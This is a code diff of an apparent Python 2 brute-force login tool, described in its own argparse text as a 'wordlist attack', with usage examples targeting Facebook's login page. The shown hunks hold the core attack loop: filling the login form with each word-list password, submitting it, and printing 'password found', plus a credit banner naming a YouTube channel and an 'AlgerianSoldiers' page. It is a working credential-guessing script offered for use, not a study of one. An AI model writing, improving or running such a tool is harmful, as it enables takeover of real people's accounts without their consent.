@@ -7,38 +7,8 @@ import time
 
 example ='''python .py -u https://www.facebook.com/lgin -uI email -us username -pI pass -w word.txt -t https://www.facebook.com/?ref=tn_tnmn 
 [+] the -t type the url in after request'''
-prompt = '''
-           _.   .'                         
-       _.-' /  :   `-.'.'                  
-    .-'-.  |        / /    :               
-  .'  o   ; \     .' /   .'                
- /,,,,,,    =`-..'  /                      
-  `.____.       `-.|     WHAT THE FUCK AM I
-         `. .-     `.                      
-          .'   |  =  \  `.                 
-          |   /       \   :                
-         /  .'\ =     =|                   
-  .'    / .'   \       |                   
- :     / /     |       |                   
-    .-','.   : | .    \|                   
-           .'  ||    = |                   
-               ||      /                   
-               || -   /                    
-               (|   ;|                     
-_              |(   -:                     
- `-._          ||   ;|                     
-  .- `-._      ||    :                     
-`-._  _  `-._ .'|,  -|                     
-    `-._l42  / .'    |                     
-        `-._((/.----.\                     
-            `(((  -  `-._                  
-                `-._   _ `-._              
-                    `-._  .- `-._          
-                        `-._  _  `-.       
-                            `-._  -        
-                                `-._ 
-                                '''
-        
+ prompt = ''' by * https://www.youtube.com/channel/UCEoSx_wkxrOlDgowepdmQLg
+                 * fb.me/AlgerianSoldiers                    '''
 arparser = argparse.ArgumentParser(description='wordlist attack')
 
 
@@ -100,19 +70,15 @@ def attack(password):
      br.select_form(nr=0)
  
        
-     ##Facebook
+     #  Url login data
      br.form[user_html_input] = user
      br.form[html_pass_input] = password
      br.submit()
      log = br.geturl()
 
-     #if log != login:
-     #   print "\n\n\n [*] Password found .. !!"
-     #   print "\n [*] Password : %s\n" % (password)
-     #   sys.exit(1)
   except Exception :
         print "\n[*] passwword found : %s" % password 
-        print "if that password does not match try the one before it .."
+        print "NOTE : if that password does not match try the one before it .."
         print 'Time elapsed: ' + str(time.time() - start_time)
         sys.exit(1)
  
